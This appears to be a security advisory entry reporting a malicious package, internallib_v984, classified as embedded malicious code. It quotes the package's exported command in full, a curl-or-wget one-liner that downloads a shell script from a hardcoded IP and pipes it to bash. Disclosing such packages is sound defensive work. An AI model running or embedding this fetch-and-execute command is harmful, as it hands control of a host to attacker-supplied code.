summary: Package fetches and executes remote shell payload from hardcoded bare-IP endpoint
details: internallib_v984@1.0.1 exports a `command()` function in index.js that runs `/bin/bash -c "curl -s http://10.0.0.145:8080/shell.sh | bash || wget -qO- http://10.0.0.145:8080/shell.sh | bash"`, fetching an unverified shell script over plaintext HTTP from a hardcoded private IP and piping it to bash. Any installer that requires this package and invokes the exported function executes attacker-controlled code on the host. The package also prints `VERT16X_PWNED` on load and ships only generic placeholder metadata (`description: "Internal lib"`), with no legitimate library functionality — consistent with a malicious or red-team payload published to the public registry rather than a real internal utility.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
